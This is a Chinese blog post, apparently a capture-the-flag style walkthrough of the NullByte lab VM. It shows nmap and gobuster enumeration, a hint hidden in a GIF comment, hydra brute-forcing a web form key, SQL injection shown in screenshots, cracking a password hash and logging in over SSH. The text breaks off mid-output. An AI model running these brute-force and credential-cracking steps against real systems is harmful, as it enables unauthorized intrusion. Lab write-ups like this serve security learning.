@@ -1,0 +1,734 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Nullbyte 靶机信息收集nmap 扫描 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889┌──(kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nullbyte靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/05/59d54dfe404f.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Nullbyte 靶机信息收集nmap 扫描 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889┌──(kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/d23d5fbf88cbc1c38cf23f700ba3db8b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3873cb73971bde1d7165d36794ddb200_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/564c4c0f4c1a237e8d227a9da585d934_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/910d473098a3ea8fb9062571638cfa57_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f89b32feebdc272bc0662f472bb45ae5_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c94cc51228028324381d85c043c760f8_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/eae0e776267506217f8024b4cef154cb_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e13059c3d018018df20af0638093e3b2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3a2d26af4b5ca61f4309ce8914eb1091_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5c7c5275db391de0f2c0871b8eb0fcc6_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/677942334b57e57092cf330f7f3ebe0b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3e80ad7f581fd4fdabda609b323c2b4d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/dca22fa6361b6f120af4c63776335fb7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0c3f1fee46eb54e9cd3f53fe0f34f4e4_MD5.png">
+<meta property="article:published_time" content="2023-05-27T09:50:00.000Z">
+<meta property="article:modified_time" content="2023-05-28T13:39:16.212Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/d23d5fbf88cbc1c38cf23f700ba3db8b_MD5.png">
+  
+  
+  
+  <title>Nullbyte靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nullbyte靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-27 17:50" pubdate>
+          2023年5月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          100 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Nullbyte靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Nullbyte-靶机"><a href="#Nullbyte-靶机" class="headerlink" title="Nullbyte 靶机"></a>Nullbyte 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.108<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00022s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>777/tcp   open  multiling-http<br>38157/tcp open  unknown<br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,111,777,38157 192.168.56.108<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 03:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00038s latency).<br><br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title: Null Byte 00 - level 1<br>|_http-server-header: Apache/2.4.10 (Debian)<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          38157/tcp   status<br>|   100024  1          40076/udp   status<br>|   100024  1          53418/tcp6  status<br>|_  100024  1          53583/udp6  status<br>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)<br>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)<br>|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)<br>|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)<br>38157/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.57 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,111,777,38157 192.168.56.108 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00026s latency).<br><br>PORT      STATE SERVICE<br>80/tcp    open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">|_  /uploads/: Potentially interesting folder</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>111/tcp   open  rpcbind<br>777/tcp   open  multiling-http<br>38157/tcp open  unknown<br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 321.11 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="Web-界面查看"><a href="#Web-界面查看" class="headerlink" title="Web 界面查看"></a>Web 界面查看</h2><p><img src="/pic/d23d5fbf88cbc1c38cf23f700ba3db8b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一张图片，main.gif，源码中没有什么有价值的信息，目录爆破一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,zip,html,sql,php -t 64<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.108<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              sql,php,txt,zip,html<br>[+] Timeout:                 10s<br>===============================================================<br>2023/05/27 05:11:27 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 294]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.108/uploads/]<br>/index.html           (Status: 200) [Size: 196]<br>/.php                 (Status: 403) [Size: 293]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.108/javascript/]<br>/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.108/phpmyadmin/]<br>/.html                (Status: 403) [Size: 294]<br>/.php                 (Status: 403) [Size: 293]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1321309 / 1323366 (99.84%)===============================================================<br>2023/05/27 05:15:20 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>看一下 phpmyadmin </p>
+<p><img src="/pic/3873cb73971bde1d7165d36794ddb200_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试弱密码失败，总不能爆破吧……再看看 uploads</p>
+<p><img src="/pic/564c4c0f4c1a237e8d227a9da585d934_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>emmmm 还是没啥思路，看一眼红队笔记，原来是首页图片中包含了隐藏信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ wget http://192.168.56.108/main.gif<br>--2023-05-28 03:43:54--  http://192.168.56.108/main.gif<br>Connecting to 192.168.56.108:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 16647 (16K) [image/gif]<br>Saving to: ‘main.gif’<br><br>main.gif                                                   100%[=======================================================================================================================================&gt;]  16.26K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-05-28 03:43:54 (95.3 MB/s) - ‘main.gif’ saved [16647/16647]<br></code></pre></td></tr></table></figure>
+
+<p>使用工具查看文件头和基础信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ file main.gif    <br>main.gif: GIF image data, version 89a, 235 x 302<br><br>┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ binwalk main.gif <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>------------------------------------------------------------------------<br>0             0x0             GIF image data, version <span class="hljs-string">&quot;89a&quot;</span>, 235 x 302<br><br>┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ exiftool main.gif <br>ExifTool Version Number         : 12.57<br>File Name                       : main.gif<br>Directory                       : .<br>File Size                       : 17 kB<br>File Modification Date/Time     : 2015:08:01 12:39:30-04:00<br>File Access Date/Time           : 2023:05:28 03:44:10-04:00<br>File Inode Change Date/Time     : 2023:05:28 03:43:54-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 235<br>Image Height                    : 302<br>Has Color Map                   : No<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 1<br>Background Color                : 0<br>Comment                         : P-): kzMb5nVYJw<br>Image Size                      : 235x302<br>Megapixels                      : 0.071<br></code></pre></td></tr></table></figure>
+
+<p>得到一串很短的字符，这时候需要发散思维，首先尝试 phpmyadmin 登录，失败。其次尝试是否是 base64 或者其他的加密方式，失败。最后尝试目录，成功</p>
+<p><img src="/pic/910d473098a3ea8fb9062571638cfa57_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>看来是个需要输入密码的地方，看一眼网页源代码</p>
+<p><img src="/pic/f89b32feebdc272bc0662f472bb45ae5_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>应该是可以爆破的，那就尝试 hydra 爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt -s 80 192.168.56.108 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span><br>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-28 04:01:11<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://192.168.56.108:80/kzMb5nVYJw/index.php:key=^PASS^:invalid key<br>[STATUS] 4504.00 tries/min, 4504 tries <span class="hljs-keyword">in</span> 00:01h, 14339895 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 53:04h, 16 active<br>[STATUS] 4088.00 tries/min, 12264 tries <span class="hljs-keyword">in</span> 00:03h, 14332135 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 58:26h, 16 active<br>[80][http-post-form] host: 192.168.56.108   login: root   password: elite<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-28 04:07:27<br></code></pre></td></tr></table></figure>
+
+<p>成功得到了密码，进入之后发现是个根据用户名查询信息的界面，异常简陋，看起来可能存在 sql 注入，尝试 <code>&#39;</code> 失败，得到如下结果，分别尝试数字和 <code>&#39;</code> 的拼接还是这个界面，</p>
+<p><img src="/pic/c94cc51228028324381d85c043c760f8_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试 <code>&quot;</code> 成功，然后就是手工构造 sql 注入语句的过程</p>
+<p><img src="/pic/eae0e776267506217f8024b4cef154cb_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>联合查询</p>
+<p><img src="/pic/e13059c3d018018df20af0638093e3b2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看数据库名</p>
+<p><img src="/pic/3a2d26af4b5ca61f4309ce8914eb1091_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看表名</p>
+<p><img src="/pic/5c7c5275db391de0f2c0871b8eb0fcc6_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看列名</p>
+<p><img src="/pic/677942334b57e57092cf330f7f3ebe0b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看内容</p>
+<p><img src="/pic/3e80ad7f581fd4fdabda609b323c2b4d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>base 64 解密一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE-&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input<br></code></pre></td></tr></table></figure>
+
+<p>看起来还是一层加密</p>
+<p><img src="/pic/dca22fa6361b6f120af4c63776335fb7_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>找一找 hash 破解工具</p>
+<p><img src="/pic/0c3f1fee46eb54e9cd3f53fe0f34f4e4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到了密码，和之前的用户名一起，尝试 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ ssh ramses@192.168.56.108 -p777<br>ramses@192.168.56.108\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109</span><br><span class="hljs-string">ramses@NullByte:~$ whoami</span><br><span class="hljs-string">ramses</span><br><span class="hljs-string">ramses@NullByte:~$ id</span><br><span class="hljs-string">uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)</span><br><span class="hljs-string">ramses@NullByte:~$ uname -a</span><br><span class="hljs-string">Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux</span><br><span class="hljs-string">ramses@NullByte:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: 